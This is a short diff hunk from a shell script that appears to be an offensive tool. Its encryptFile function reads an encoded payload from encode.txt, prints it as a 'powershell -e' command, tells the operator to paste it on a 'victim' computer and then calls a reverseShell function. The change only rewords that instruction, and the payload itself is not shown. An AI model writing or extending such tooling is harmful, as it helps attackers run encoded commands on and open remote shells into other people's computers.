@@ -26,7 +26,7 @@ encryptFile() {
     clear ; sleep 5
     code=$(cat encode.txt)
     echo powershell -e $code
-    printf "\nJust Paste this Command to Victim Powershell\n"
+    printf "\nJust Paste this Command on Victim Computer\n"
     printf "\n"
     reverseShell
 }
